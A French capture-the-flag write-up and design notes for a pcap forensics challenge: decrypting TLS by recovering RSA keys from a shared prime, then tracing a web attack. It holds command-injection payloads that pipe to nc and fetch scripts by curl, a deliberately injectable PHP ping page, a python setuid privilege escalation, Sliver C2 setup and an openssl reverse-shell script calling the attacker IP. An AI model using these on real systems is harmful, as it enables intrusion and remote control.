# Writeup Revmomon

## TL;DR

Analyse du pcap, voir qu'il y a deux flux TLS (port 443/TCP et 8443/TCP de l'IP 172.17.0.5). Trouver le facteur commun entre les deux certificats et récupérer les clés privées. Ensuite déchiffrer le flux, retracer l'attaque et récupérer le binaire. Lorsque le binaire est extrait, en faire le sha256 et valider l'épreuve.

## Enoncé

Il semblerait que le serveur web se soit fait attaquer. Par chance, il a été possible de récupérer un PCAP. Trouvez la backdoor placée par l'attaquant. Le flag est le SHA256 du binaire.

Le lien du PCAP: `https://mega.nz/#!eqQV3SwD!_jAfHMqMw9d-LIDoTDR9JziwNicsxkYymS87eR4pLUg`
MD5 du PCAP : c93adc996da5dda82312e43e9a91d053

## Résolution de l'épreuve

### Etat des lieux

A l'ouverture du PCAP, on peut voir énormément de paquets entre l'ip `172.17.0.5` et `172.17.0.1`. Du premier paquet au 170281, c'est une alternance de paquets SYN / RST, caractéristique d'un Stealth Scan de nmap. Il est possible de le voir autrement grâce aux premiers ports scannés : 

![](https://i.imgur.com/WYt7gPe.png)

Enfin le user agent "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" est plutot clair.

La première hypothèse est de voir que l'ip `172.17.0.1` est l'attaquant et `172.17.0.5` est l'attaqué. Il y a un peu de traffic externe, pour ne pas se faire polluer par le reste, un premier filtre est de rigueur : 

> ip.addr == 172.17.0.1 && ip.addr == 172.17.0.5

Au final la première réelle action utilisateur semble être au stream TCP 85663, car un paramètre POST valide, avec un argument cohérent est passé.

### Point d'entré de l'attaquant

Au stream TCP 85664, on peut voir qu'une injection de commande a été tentée : 

![](https://i.imgur.com/s77Wuf0.png)

> 127.0.0.1; id | nc 172.17.0.1 12345

Et cette injection de commande a l'air d'avoir fonctionné : 

![](https://i.imgur.com/qhUtVxO.png)

### Exploitation de l'attaquant

L'attaquant semble executer un script en mémoire : 

![](https://i.imgur.com/enqXS1Y.png)

> 127.0.0.1 ; curl -k https://172.17.0.1/a.sh | bash

Bien entendu ce site n'est pas accessible il n'est pas possible de récupérer le script __a.sh__. Les stream tcp suivant (85667 / 85668) doit être le téléchargement wget via https.
Une différence intéressante réside dans le changement de port entre le stream 85668 (port 443 sur l'ip de l'attaquant) et le stream 85669 (port 8443 sur l'ip de l'attaquant).
Vu la tete des paquets TCP, on peut se douter que c'est du TLS : 

![](https://i.imgur.com/qf2PUmz.png)

Donc un peu de configuration wireshark pour le dissector TLS fasse son travail sur le port 8443, il faut modifier la config du HTTP : 

![](https://i.imgur.com/Akz19kF.png)

Finalement on voit bien un "Client Hello" sur le port 8443 : 

![](https://i.imgur.com/2Eu7hko.png)

Avant de passer à la suite, on a pu déterminer que l'exploitation a commencé au stream tcp 85664, soit le paquet 183387. On va appliquer un filtre pour masquer tous les paquets d'avant et enregistrer ce nouveau pcap. Ce sera plus simple à manipuler qu'un pcap de 35 Mo. Le filtre wireshark : 

> (frame.number >= 183387) && (ip.addr == 172.17.0.1 && ip.addr == 172.17.0.5)

Et "File > Exported Selected Packet"

![](https://i.imgur.com/Pozr7nJ.png)

On passe de 185701 paquets à 2077, ce qui est plus confortable.

### Crypto attack

#### Trouver la vuln

On récupère le "Server Hello" de la connexion sur le port 443 et 8443. Première chose intéressante, les "issuer": 

![](https://i.imgur.com/lCiec87.png)

Référence à "Prime Minister" dans les deux. De plus, malgrés les suites de chiffrement safe proposées par le client, le serveur a décidé d'utiliser une suite n'utilisant pas Diffie Hellman: 

![](https://i.imgur.com/gxDGQP0.png)

Référence à prime, pas de diffie hellman -> attaque sur le rsa ? 
S'il est possible de récupérer une clé privé, alors il sera possible de déchiffrer les communications. S'il y avait eu un DH, DHE, ECDH ou ECDHE, alors il aurait fallu connaitre cet aléa échangé. Enfin, un certificat ssl est la composante publique du RSA, donc les attaques classiques de RSA sur clé publiques sont possibles.

#### Extraction des certificats

Pour cela, il faut extraire les certificat. CLquer sur le trame "Server Hello" et selectionner le "Certificate" dans le paquet: 

![](https://i.imgur.com/Yhwv2IU.png)

Un CTRL+MAJ+X ou File > Export Packet Bytes et le certificat est extrait. Il faut faire la meme chose pour l'autre port.

#### Conversion DER to PEM

Avant de faire une attaque avec RsaCtfTool, qui a l'avantage de tester tout un tas d'attaque, l faut convertir ces certificat DER au format PEM: 

```bash
# DER to CRT
openssl x509 -inform der -in 5_443.der -outform pem -out 5_443.crt
openssl x509 -inform der -in 5_8443.der -outform pem -out 5_8443.crt

# CRT to PEM
openssl x509 -pubkey -noout -in 5_443.crt -out 5_443.pem
openssl x509 -pubkey -noout -in 5_8443.crt -out 5_8443.pem
```

#### Facteur commun

Pour lancer RsaCtfTool sur plusieurs clés publiques il suffit de: 

```bash
➜  writeup git:(master) ✗ /opt/tools/crypto/RsaCtfTool/RsaCtfTool.py --publickey "*.pem" --private --verbose                                                                                                                             
[*] Multikey mode using keys: ['5_8443.pem', '5_443.pem']                                                                                                                                                                                
[*] Found common factor in modulus for 5_8443.pem and 5_443.pem                                                                                                                                                                          
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEA8k6sQzkomqCjeOPJ10idYw5K/EJ/crLCWcKZy79hyOiIAHbn
P3icrfeD8S7qnb6HwMyKvuu1rLkABP8RUVClDlfyMKcZMO8p8kgj+xs82FzMJBeJ
iEsqSG6t/8zp26/W1oqtGWpderbaO0eZj03ExuyoedbNggfuYCqe7AB9WB8/B7p3
TEjwnNE7bRc4RBL5KhqzB2plYrrNDqhor5jo/RBgDGdnQGMEo0+A8oZPGzmq4d+l
E2TxA4FCXKBw2M6C+PdmwkktK1ZF26w/Mk0gEO5DVh0MgPkumEFifTmq9QgpUy8q
ki/j8yI320MmF6WQer4qtgFpdmFwUQb6KvKnSQIDAQABAoIBAHp/Y38oqmphw8Me
BbCcuVSWqToWtC/cR3zxcKccvebAB+GUOxxPcYZRl5aazWmqJR9HSO10ZIhJjsT3
3l1pk8hIldwa3hVrE5208tvDzWLkpx+n9pO8zEeKDNVBVwkFQGt9+DzdFR0wy+sk
K3HTMyQOCK5v9b1DHTPo2CcfqD6fsXW1cG3VfqlvT+iXyp9Z8hreA78MTEnfSzVW
g/UMUn1Y/ZjiO7l34JBm2Q0aiHBiRdBIatTDDw9uATrY491Ut/bRCWo9++iC7Kz0
t5jH28YynQp7upq2ZaLtb3QA/aggEdTN+jWs/EZSmdSY1JN2zUrPkJ81FR3vw+/z
paUe27ECgYEA9Qgo401V7TQhlP0XNKsWFuH6GwmZKEBBtXBF9nk26CbTZ+Er6SS0
tm3zYqUH+VkdnO+c//S/FmG/eSi3e4kB5dGsskzGzjjJzbtACenn1SRBUo0TfCZy
T6DMWXMDRvuOJEWYa8jCJ040qCSIbGYg9WoJ6+jn9jwtpIbZkqLS9pMCgYEA/SdK
0PMQ9UMOtW2PjPwCKF8uymRdh4KgfWufWmrsCTsHYqinKrF9FhxUeSNHN2qPmPnI
yW0LIvcVAzVA5c9weJgvqOfOigsBQaOcW0FqO8OswtGPyH3//dUIyB/vuZu5LYi4
93ECyON95PXpubDvgY4GJwM0Lo9vpdaqt/nTWDMCgYBLWUQBidGHjMVa5G0TZBz5
0mmvkMcJKqFKIwlQnru0rePKiOKQ4hm0E6GJTwhhs/a4QLK9vsxYHJzdrBioI1xz
CIQbnCJyXeIoopExuzzwPSLdOMaqIcR7Gg5c31I9rLNsEf6p/mU94v2sSvespccy
0HXWlptmC+FZO6KCRhGrgwKBgBQETVgkQA0Ell8mIJmnO4xxqkN6mCKk44fHQLxn
g+5e6oCUkVNA4YEkEFHbxj/Nfzk7VvMGWkEThGfSiCUjt+LxNaOHYL9ti1XjV/On
Qn0jRb/JzjKuM9WgSKd6TvxAIe5Fx0pZdzznMAcwoqB6KxX1Yusmx7N+x/c2+By/
9kQdAoGAYxsY9EhchdDsUy5f2DrsQIeCQJueLexVVxebo4rpgb7NCybqqI55qbjd
2CMdY+8Fw74L2zxwgFDgngrIHsjIMqUNp64pgp+4qqjN+ix0ue86ZTlnaqgK3uaw
DDlBMgDIvOc+FYcy1aeqpCQHi8R1EIjlqZGvlV8wTwv9dJ+N/ug=
-----END RSA PRIVATE KEY-----
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA6qH1D3mce4pI40aDTFHHnU8I84OU7NCR3KD4pTCsktys6cth
OdZ4YnR6a3SBIEAmpq8p/3KI9fmQO43JJj+N4vWEgsA8S5F3CQZtbKr2ILrCX8BX
apicvYFHXWl567xWGepkqjdFBAqC8NdpE95ZhZDpwzRgj0DIJRBaKJ9ROdKeo8bY
atXRCdm/+Q9Cw8rdknZQtnJh8Jc061UWdEaRR5FINQZtNmDkwzehDYD+elZ9zmNX
oRrB+wYQNuoHTVunBihCFz/WUcoqcItPSoheWGiy+Ok4B0QcBCELhVs5RpSjp6C/
0yl+0mx3P+1743JsKUmnu1fAYKi3oHAG4sgYFQIDAQABAoIBAGmSVeGQpogvwHwC
zjEY2ug9F5n6KpgjgH31L+uj6wJpqKPJjwWnKqOiJTMUSMVqF/oH9q2pq1aB5BPn
yAodrongTq9GL9sQqK625aVvhy9S2QKcWLjt0hiygpnVS7Z2F4exn3m3RKZ81E3p
nq4B7eXbPlNGzeunCmci5G5CwRlyfsGxNlpFy6pcdytGwCt9+WRS36Yrc8jZQm8x
qiyA93pTAYBt3Hb0/edpKj6e9dbGIi3YMPpL0TpF63+629uSpP1mW9A2IMVP+I8N
nBIwxpazruhla/TOOF8nlUTiLtZc5fSnNCgprMXFYmBlB+DCVarS+VD2mqx+ugzm
DxUtekECgYEA9Qgo401V7TQhlP0XNKsWFuH6GwmZKEBBtXBF9nk26CbTZ+Er6SS0
tm3zYqUH+VkdnO+c//S/FmG/eSi3e4kB5dGsskzGzjjJzbtACenn1SRBUo0TfCZy
T6DMWXMDRvuOJEWYa8jCJ040qCSIbGYg9WoJ6+jn9jwtpIbZkqLS9pMCgYEA9SKh
xuY/zb9sl0MbGTB5j4ZKcpNVLh9YCgiRDsXDpUeLNmsOWqJCS0Gep+hSyGEDmbeD
ijZ02c0GXccpjjYgPltqiREE5j6jUKHLPm8ZuQ+Ia/v6yJGOUMlJZ+14I86+TKtm
AxCsVZOeHEmV4gSFos3l063n1ywtgmZmkS7m97cCgYBLWUQBidGHjMVa5G0TZBz5
0mmvkMcJKqFKIwlQnru0rePKiOKQ4hm0E6GJTwhhs/a4QLK9vsxYHJzdrBioI1xz
CIQbnCJyXeIoopExuzzwPSLdOMaqIcR7Gg5c31I9rLNsEf6p/mU94v2sSvespccy
0HXWlptmC+FZO6KCRhGrgwKBgF3QMCuHiJl8Ddnhs6gzNgJoeWtZ2Tp6gl3so18M
7m/9bliYJfknqclVRpupvKy0/ATDB5NIffWwkiQniU7Ehhh3MdFc8wwOor/D+51c
NXLub94ro/FISze9oNsmNVk20PtUiQjZQ6rIgLUAsFy8MEx7Ed6t6lEdthj2iYA8
e+YHAoGBALUVvWU6bh85o86amHzSK8tuHrEXthrzHn6xDwrKNpFFNqL6lepCVKx0
pH7Ul9V489IRNsOHtKyHewJXyJAsRJrP6c7veE49kjBrIkXHjCf8zhuiqtPdpE1V
LIXge+kDK5K/FLJN+jtrapJ1DHtuAwsrxD8e4/aB6eGiSsSFMRXU
-----END RSA PRIVATE KEY-----
```

Il y a donc un facteur commun entre les certificats PEM et permet de récupérer les clés privés de chaques flux.

#### Déchiffrement du tls dans le pcap

Donc maintenant il suffit de déchiffrer le flux TLS avec Wireshark: Clique droit sur un paquet TLS1.2 > Protocole preferences > Open ... > RSA keys list

![](https://i.imgur.com/5uEbdV2.png)

Ci-dessous la configuration pour déchiffrer les flux: 

![](https://i.imgur.com/jvW76xL.png)

### Analyse du pcap déchiffré

#### Flux sur le port 443

Maintenant que les flux sont déchiffrés, regardons le premier flux tcp: 

![](https://i.imgur.com/vDnJxbC.png)

Le script bash va télécharger un certificat PEM (/dev/shm/cert2.pem) et faire un reverse shell openssl sur le port 8443: mystère résolue, la transaction sur le port 443 est le serveur web https de l'attaquant et celle sur le 8443 est le reverse shell openssl.

#### Flux sur le port 8443

L'attaquant cherche à élever ses droits, il a drop un LinEnum pour énumérer un maximum de choses:

![](https://i.imgur.com/jHW9G42.png)

L'élevation de privilèges se situe un peu plus bas avec le payload:

`/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'`

Cette élévation de privilèges s'explique par le fait que python a des capabilities particulières:

![](https://i.imgur.com/KAq2zoc.png)

Et c'est ce que l'attaquant a vu dans son LinEnum. D'ailleurs, je crois que l'attaquant un message pour le challenger, pour signifier qu'un flag est dans le /root:

![](https://i.imgur.com/SXOEyhi.png)

La fin du flux montre le téléchargement d'un binaire "DRUNK_IKEBANA" et le place dans le dossier /usr/bin/phar.bak. Il est possible de récupérer le binaire: 

![](https://i.imgur.com/d6xdZeN.png)

Il est possible d'exporter le binaire via le menu File > Export Objects > HTTP > DRUNK_IKEBANA

Et voilà, pour valider l'épreuve, il suffit de trouver le SHA256 du binaire:

```bash
$ sha256sum DRUNK_IKEBANA 
daeb4a85965e61870a90d40737c4f97d42ec89c1ece1c9b77e44e6749a88d830  DRUNK_IKEBANA
```

### Flag 

> SANTA{daeb4a85965e61870a90d40737c4f97d42ec89c1ece1c9b77e44e6749a88d830}

## Conception du challenge

Le but est de faire un challenge de forensic suivi d'un hackback, ou plutot suivi d'un preuve d'exploitation.

Le challenge commence avec un fichier pcap avec pas mal de choses, notamment du bruit. 

1. Trouver l'ip malveillante
2. Trouver les deux canaux de communications chiffrés
3. Faire une attaque "RSA facteur commun", pour récupérer les deux clés privés
4. Déchiffrer le pcap
5. Retracer l'attaque qui a eu lieu
6. Récupérer le hash sha256 de la backdoor => flag 1
7. Refaire l'attaque qui a eu lieu
8. blind rce sur la page web
9. reverse shell avec improve tty 
10. Privesc avec un Lua ouvert sur le port 1234/TCP sur le localhost
11. Récupérer le second flag dans le /root

### Génération du docker 

* Dockerfile

```bash
FROM php:7-apache

RUN apt-get update
RUN apt-get -y install procps iputils-ping net-tools python curl wget netcat.openbsd

RUN setcap cap_setuid,cap_net_bind_service+ep /usr/bin/python2.7
COPY index.php /var/www/html

COPY ./start.sh /start.sh
RUN chmod +x /start.sh

EXPOSE 80

CMD ["/start.sh"]
```

* index.php

```php
<html>
<head>
    <title>Ping, ping everywhere!</title>
    <meta chargset="utf-8" />
    <style>
    html {
        height: 100%;
    }
    body {
        background: linear-gradient(#e66465, #9198e5);
        height: 100%;
        margin: 0;
        background-repeat: no-repeat;
        background-attachment: fixed;
        text-align: center;
    }
    input {
        margin-top: 100px;
        width: 50%;
    }
    </style>
</head>
<body>
    <form method="POST" action="/index.php">
        <input type="text" name="cli_ip" placeholder="Ping your IP address" />
    </form>
    <pre>
    <?php
        if(isset($_POST['cli_ip'])) {
            if(exec('ping -c 3 '.$_POST['cli_ip'])) {
                echo "Host is up! :D";
            }
            else {
                echo "Host is down! :(";
            }
        } 
    ?>
    </pre>
</body>
</html>
```

* start.sh

```bash
#!/bin/bash

service apache2 start
sleep infinity
```

### Génération des pairs de clés

#### Clés privés

Pour l'attaque crypto, il faut créer 2 clés publique avec 3 primes (p1/q1 et p1/q2). L'outil "RsaCtfTool" de Ganapati fait le job parfaitement. Les primes ont été généré avec openssl (génération de privkey, et dumpkey de rsactftool pour récup les infos)

```bash
/opt/tools/crypto/RsaCtfTool/RsaCtfTool.py -p 172139848360492097627532237665748817186130727558351534607444870923548009509868353037703016237976451505247356305986695205743644826386491010648599514045927497365144948373492033540080022022978955739928989628552112005426472361563551097049376535679226058135199234298158833692076989494463737727421130902932740831159 -q 172067233411000174123288570320072141984329277731567787049992455089748125896067043634268223276124200546620464642208269498585977273172872453697611433904621370678490295872941062747046839302970872936949583606000707115626511913565629330486713525750799307850325576945065814233311827585627901219469077071493371983507 -e 65537 -n 29619627467178969406854079403463599915871658288476677270831102061793497934159662285514510327385700628378589305421437171709795346003094548759628250322764002847148435692477244479388763329813686684201660423274495404811778410506932910300216875896775312348918429580174725852674828634098639553636546413084035530031283855213320078578741271070732953030117908357848717141509425260478003664503348447111743061219093114960558269923676606146414164748797713467491614709083233759517937681221656041489826498974094813539583189934143472418883692302711288587072716807105868149209556970774501083495918309228876519388189482569883619694613 --private > key_priv1.key

/opt/tools/crypto/RsaCtfTool/RsaCtfTool.py -p 177770422925274187928270263913090171434820304838404175460008885181148671815744654617485711962736693271542084623895609200471749695331928650874811932826730881806693136957123470431378129644744960670133665786344874809797695223410201961089714532526628565293568429798849498745057405920425956211314837341926814079027 -q 172067233411000174123288570320072141984329277731567787049992455089748125896067043634268223276124200546620464642208269498585977273172872453697611433904621370678490295872941062747046839302970872936949583606000707115626511913565629330486713525750799307850325576945065814233311827585627901219469077071493371983507 -n 30588464855055370059397808311584587800331478796837484201499522366071377859360910819579349170786760505546761273257680417594923583479957908661697555140368862662613536591346698985905175343119461281306864239119280639106589310801053583144048931656425940217457170988561914099102270870509491862752401296222115766858612659267640341229452933477551468397714444142587906203000835769622618731613797887097456579263262040530311297050197485572507425877926039763557707646155709261620616335196646065292172815191664334235605058750259343798359510428053696625102332956941127444708167469018975315598974910298399214310051525315764438607689 -e 65537 --private > key_priv2.key
```

> p1 = 172139848360492097627532237665748817186130727558351534607444870923548009509868353037703016237976451505247356305986695205743644826386491010648599514045927497365144948373492033540080022022978955739928989628552112005426472361563551097049376535679226058135199234298158833692076989494463737727421130902932740831159
> q1 = 172067233411000174123288570320072141984329277731567787049992455089748125896067043634268223276124200546620464642208269498585977273172872453697611433904621370678490295872941062747046839302970872936949583606000707115626511913565629330486713525750799307850325576945065814233311827585627901219469077071493371983507
> p2 = 177770422925274187928270263913090171434820304838404175460008885181148671815744654617485711962736693271542084623895609200471749695331928650874811932826730881806693136957123470431378129644744960670133665786344874809797695223410201961089714532526628565293568429798849498745057405920425956211314837341926814079027
> q2 = q1 = 172067233411000174123288570320072141984329277731567787049992455089748125896067043634268223276124200546620464642208269498585977273172872453697611433904621370678490295872941062747046839302970872936949583606000707115626511913565629330486713525750799307850325576945065814233311827585627901219469077071493371983507
> e = 65537
> n = p*q

#### Certificat SSL/TLS

Pour générer les certificats SSL/TLS (qui seront utilisés pour le serveur python et le reverse shell openssl) : 

```bash
openssl req -key key_priv1.key -new -x509 -days 3000 -out cert1.crt
openssl req -key key_priv2.key -new -x509 -days 3000 -out cert2.crt
```

Remplir avec des conneries évidemment. Mais surtout des trucs en lien avec "prime" pour mettre sur la piste d'un prime commun.

### Mise en place de l'infra red team

#### Docker debian pour sliver-server

* sliver release : https://github.com/BishopFox/sliver/releases/download/v0.0.6-alpha/sliver-server_linux.zip

* docker debian latest : `docker run --rm --name sliver-server -v ${PWD}:/opt/host -it debian:latest /bin/bash`

Cmd ds dans le docker : 

```bash
apt update && apt install build-essential mingw-w64 binutils-mingw-w64 g++-mingw-w64
cd /opt/host && ./sliver-server
```

C'est le __serveur sliver__ on utilisera l'hote pour le client sliver.

Cmd pour sliver : 

```bash
multiplayer
new-player --operator maki --lhost 172.17.0.2 # IP du docker sliver-server
https #Pour lancer un listeners https
```

#### Mise en place du client sliver

* sliver-client  : https://github.com/BishopFox/sliver/releases/download/v0.0.6-alpha/sliver-client_linux.zip

On va le mettre sur l'hote et se connecter au docker sliver
On utilise la configuration générée par le sliver-server pour se connecter directment dessus : 

```bash
sudo ./sliver-client -config maki_172.17.0.2.cfg
```

![](https://i.imgur.com/3uu9EnO.png)

```bash
generate --os linux --http 172.17.0.2 #gen agent

```

#### Python server SSL

* server.py

```python
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('172.17.0.1', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, 
                                ciphers="AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA256:AES128-SHA256",
                                ssl_version=ssl.PROTOCOL_TLSv1_2,
                                certfile='../keys/cert1.crt', 
                                keyfile="../keys/key_priv1.key", 
                                server_side=True)
httpd.serve_forever()
```

* Pas mettre le serveur dans le meme dossier que les clés
* ciphers : Que des ciphers qui n'utilisent pas Diffie Hellman, sinon même avec la clé privé c'est pas possible de récupérer le clair.
* ssl_version : TLS 1.2 max, depuis TLS 1.3 on peut plus faire ce genre d'attaque.
* 172.17.0.1 : plutot que 0.0.0.0 pour faire tout dans le réseau docker

```bash
sudo python ./server.py
```

#### Reverse shell openssl 

```bash
openssl s_server -quiet -key keys/key_priv2.key -cert keys/cert2.crt -port 8443 -tls1_2 -cipher AES256-GCM-SHA384
```

* -tls1_2 : Forcer l'utilisation de TLS 1.2.
* -cipher : Une suite de chiffrement sans DH encore une fois.

#### Script d'attaque

Un script `a.sh` sera executé sur la machine victime lors de l'attaque. Ce script à pour but de venir chercher le certificat ssl, le mettre dans le /dev/shm et initier un reverse shell openssl :

* a.sh

```bash
#!/bin/sh

IP_ATTACKER="172.17.0.1"
OPENSSL_PATH=$(which openssl)

wget --no-check-certificate https://${IP_ATTACKER}:443/keys/cert2.crt -O /dev/shm/cert.pem

mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ${OPENSSL_PATH} s_client -quiet -CAfile /dev/shm/cert.pem -verify_return_error -verify 1 -connect ${IP_ATTACKER}:8443 > /tmp/s; rm /tmp/s
```

* IP_ATTACKER : Mettre son IP, pour le retour du reverse shell

Au final on se retrouve avec un pcap full TLS : 

![](https://i.imgur.com/SO6N0qC.png)

### Lancement de la machine vuln

* build

```bash
docker build . -t revmomon
```

* run

```bash
docker run -d --rm --name revmomon -t revmomon:latest
```

* exec 

```bash
docker exec -ti revmomon /bin/bash
```
